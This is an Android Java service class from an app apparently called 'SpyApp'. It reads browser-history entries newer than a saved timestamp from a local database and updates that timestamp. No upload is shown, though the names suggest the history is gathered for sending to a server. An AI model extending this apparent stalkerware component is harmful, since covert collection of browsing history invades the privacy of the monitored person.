package com.app.spyapp.servercall;

import android.app.IntentService;
import android.content.Intent;

import com.app.spyapp.SpyApp;
import com.app.spyapp.common.Const;
import com.app.spyapp.common.Pref;
import com.app.spyapp.model.BrowserModel;

import java.util.ArrayList;

/**
 * Created by Ankit on 6/4/2016.
 */
public class HistoryCallService extends IntentService {

    private SpyApp spyApp;

    public HistoryCallService() {
        super(HistoryCallService.class.getSimpleName());
    }

    @Override
    protected void onHandleIntent(Intent intent) {
        spyApp = (SpyApp) getApplicationContext();
        ArrayList<BrowserModel> historyList = spyApp.getDatabaseHelper().getHistoryList(spyApp.getSharedPreferences().getString(Pref.HISTORY_LAST_UPDATEDATE, Const.INITDATETIME));
        spyApp.getSharedPreferences().edit().putString(Pref.HISTORY_LAST_UPDATEDATE, spyApp.getDatabaseHelper().getMaxDateofHistory()).apply();

    }
}
